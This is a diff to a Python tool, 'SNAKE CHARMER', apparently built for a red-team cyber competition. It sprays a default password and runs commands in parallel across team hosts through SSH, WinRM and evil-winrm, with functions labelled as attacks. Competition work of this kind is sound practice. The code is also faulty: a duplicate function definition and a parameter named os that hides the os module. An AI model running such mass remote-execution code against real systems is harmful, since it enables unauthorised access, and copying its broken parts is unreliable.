@@ -7,34 +7,74 @@ from concurrent.futures import ThreadPoolExecutor
 import re
 import winrm
 from winrm import exceptions as winrm_ex
+import requests
+import socket
+from winrm.protocol import Protocol
+import subprocess
+from typing import Tuple, Dict
+import socket
+import subprocess
+from typing import Tuple, Dict
+import shutil
+import shlex
+import os
+
+
 WORKERS=30 #how many threads run at once
 HOSTNAME_DICT={'BIG BANG':1,'DINO ASTEROID':2,'VIKING RAIDS':4,'ENLIGHTENMENT':5,'CHERNOBYL':6}
 
-def single_connection_command_windows(hostname_in,username_in,password_in,command_in):
-    session = winrm.Session(hostname_in,auth=(username_in,password_in))
-    session.transport.session.timeout = 10
+def single_connection_command(hostname_in,username_in,password_in,command_in,os):
+    if (os == "L" or os == "LINUX"):
+        single_connection_command_linux(hostname_in,username_in,password_in,command_in)    
+    elif (os == "W" or os == "WINDOWS"):
+        single_connection_command_windows(hostname_in,username_in,password_in,command_in)
+    else:
+        print("INVALID")
+
+
+
+def single_connection_command_windows(hostname_in, username_in, password_in, command_in,
+                                      connect_timeout=5, operation_timeout=30,
+                                      transport='ntlm', server_cert_validation='ignore'
+                                     ) -> Tuple[bool, Dict]:
+    """
+    Execute evil-winrm via os.system (shell). Minimal, for local/lab use.
+    - command output prints directly to the terminal (no capture).
+    - uses shlex.quote to safely embed inputs in the shell command.
+    - returns (success_bool, info_dict).
+    """
+    # check evil-winrm exists
+    if shutil.which("evil-winrm") is None:
+        print("[FAILURE] evil-winrm not found in PATH")
+        return False, {"reason": "missing_executable"}
+
+    # build shell command with quoted fields
+    cmd = (
+        "evil-winrm -i " + shlex.quote(hostname_in) +
+        " -u " + shlex.quote(username_in) +
+        " -p " + shlex.quote(password_in) +
+        " -c " + shlex.quote(command_in)
+    )
+
+    # run the command; output goes straight to the terminal
+    status = os.system(cmd)
+
+    # normalize exit code on POSIX
     try:
-        r = session.run_cmd(command_in)
-        stdout = r.std_out.decode(errors="ignore") if r.std_out else ""
-        stderr = r.std_err.decode(errors="ignore") if r.std_err else ""
-        print(r.std_out.decode())
+        if os.WIFEXITED(status):
+            exit_code = os.WEXITSTATUS(status)
+        else:
+            exit_code = status
+    except AttributeError:
+        # non-POSIX (unlikely here), use raw status
+        exit_code = status
 
-        if r.status_code != 0:
-                return False, {
-                    "reason": "remote_nonzero_exit",
-                    "status_code": r.status_code,
-                    "stdout": stdout,
-                    "stderr": stderr,
-                }
-    except winrm_ex.InvalidCredentialsError as e:
-        print("Invalid credentials for winrm host: ",hostname_in,username_in,":",password_in,sep="")
-    except winrm_ex.WinRMOperationTimeoutError as e:
-        print("Timedout, host likely down or firewalled off or something host",hostname_in)
-        raise TimeoutError
-    except Exception as e:
-        print("Unexpected error on host",hostname_in,e)
+    if exit_code == 0:
+        return True, {"returncode": exit_code}
+    else:
+        print(f"[FAILURE] evil-winrm failed for {hostname_in} (rc={exit_code})")
+        return False, {"reason": "nonzero_return", "returncode": exit_code}
 
-#ONE CONNECTION (called durring the multi-connect)
 def single_connection_command_linux(hostname_in,username_in,password_in,command_in):
     try:
         client = paramiko.SSHClient()
@@ -62,15 +102,15 @@ def make_target_list(ip_string, variable_list): # pass it a string to be modifie
 
 #RUNS THE MINIONS, also does the OS switch
 def run_multiple_multithread(ip_list,username,password,command,os):
-
-    if os == ("L" or "Linux"):
+    if (os == "L" or os == "LINUX"):
         with ThreadPoolExecutor(max_workers=WORKERS) as executor:
             for ip in ip_list:
                 executor.submit(single_connection_command_linux, ip,username,password,command)
-    elif os == ("W" or "Windows"):
+    elif (os == "W" or os == "WINDOWS"):
         with ThreadPoolExecutor(max_workers=WORKERS) as executor:
             for ip in ip_list:
                 executor.submit(single_connection_command_windows,ip,username,password,command)
+            
 
 #ATTACK FUNCTIONS
 def team_attack(teamnumber,username,password,command,os):
@@ -114,7 +154,7 @@ def expand_wildcards(ip_template,username,password,command,os): #pos 2: wildcard
             backtrack(idx + 1, current + [val])
 
     backtrack()
-    print(expanded_ips)
+    # print(expanded_ips)
     run_multiple_multithread(expanded_ips,username,password,command,os)
     
     
@@ -124,19 +164,20 @@ def expand_wildcards(ip_template,username,password,command,os): #pos 2: wildcard
 #CLI
 def cli_interface():
     print("\n ~~ SNAKE CHARMER ~~\n")
-    
-    print("Invalid input! Quitting")
     username=input("Target user: ")
     password=input("Target Password (leave blank for default): ")
     if password=="":
         password="Change.me123!"
     print("Using credentials ",username,":",password,sep="")
     command=input("\nCommand to run: ")
-    os=input("Linux or Windows").upper()
+    # os=input("Linux or Windows: ").upper()
+    os="LINUX"#WINDOWS DOESNT WORK HAND CODE LINUX
+    if os not in ["LINUX","L","WINDOWS","W"]:
+        print("invalid answer!")
+        quit()
 
     targets_input = input("Enter either a: \n-Single IP address (192.168.1.1)\n-A single team name ('team01','team2', ... ,'team18'), \n-Single box type ('Big Bang, Dino Asteroid, Viking Raids, Enlightenment, Chernobyl, etc')\n-All ('All')\nInput: ").upper()
     box_targets=['BIG BANG','DINO ASTEROID','VIKING RAIDS','ENLIGHTENMENT','CHERNOBYL']
-    box_targets_windows=['WRIGHT BROTHERS','MOON LANDING','PYRAMIDS','FIRST OLYMPICS','SILK ROAD']
 
     if "TEAM" in targets_input:
         if targets_input[-2:-1]=="1":
@@ -153,12 +194,10 @@ def cli_interface():
     elif "ALL" in targets_input:
         all_attack(username,password,command,os)
     elif "-" in targets_input:
-        
-        # wildcard(targets_input,tack_dict,username,password,command)
         expand_wildcards(targets_input,username,password,command,os)
 
     elif (re.match(r"^(?:(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)$",targets_input)) or targets_input=="LOCALHOST":
-        single_connection_command_linux(targets_input,username,password,command,os) 
+        single_connection_command(targets_input,username,password,command,os) 
 
     else:
         print("No matching entries!!")
@@ -273,5 +312,57 @@ def run_on_every_team_one_box_cloud(box_numb,username,password,command):
         for ip in final_ips:
             executor.submit(single_connection_command_linux, ip,username,password,command)
 
+# place these imports at top of your file
+def single_connection_command_windows(hostname_in, username_in, password_in, command_in,
+                                      connect_timeout=5, operation_timeout=10,
+                                      transport='ntlm', server_cert_validation='ignore'):
+    """
+    Run a WinRM command with explicit timeouts and print output.
+    Prints stdout if command succeeds, prints failure reason otherwise.
+    Returns (success_bool, result_dict)
+    """
+    # Build endpoint
+    endpoint = f'http://{hostname_in}:5985/wsman'
 
+    try:
+        session = winrm.Session(endpoint, auth=(username_in, password_in))
+
+        # Run command
+        r = session.run_cmd(command_in)
+        stdout = r.std_out.decode(errors="ignore") if r.std_out else ""
+        stderr = r.std_err.decode(errors="ignore") if r.std_err else ""
+
+        if r.status_code != 0:
+            # failure
+            print(f"[FAILURE] Host: {hostname_in}, Status: {r.status_code}")
+            if stdout:
+                print("STDOUT:", stdout)
+            if stderr:
+                print("STDERR:", stderr)
+            return False, {
+                "reason": "remote_nonzero_exit",
+                "status_code": r.status_code,
+                "stdout": stdout,
+                "stderr": stderr
+            }
+
+        # success
+        print(f"[SUCCESS] Host: {hostname_in}")
+        print(stdout)
+        return True, {"stdout": stdout, "stderr": stderr, "status_code": r.status_code}
+
+    except winrm_ex.InvalidCredentialsError:
+        print(f"[FAILURE] Invalid credentials for host {hostname_in}")
+        return False, {"reason": "invalid_credentials"}
+    except winrm_ex.WinRMOperationTimeoutError:
+        print(f"[FAILURE] WinRM operation timed out on host {hostname_in}")
+        return False, {"reason": "winrm_timeout"}
+    except (requests.exceptions.ConnectionError, socket.timeout) as e:
+        print(f"[FAILURE] Connection error on host {hostname_in}: {e}")
+        return False, {"reason": "connection_error", "error": str(e)}
+    except Exception as e:
+        print(f"[FAILURE] Unexpected error on host {hostname_in}: {e}")
+        return False, {"reason": "unexpected_error", "error": str(e)}
+
+            
 '''
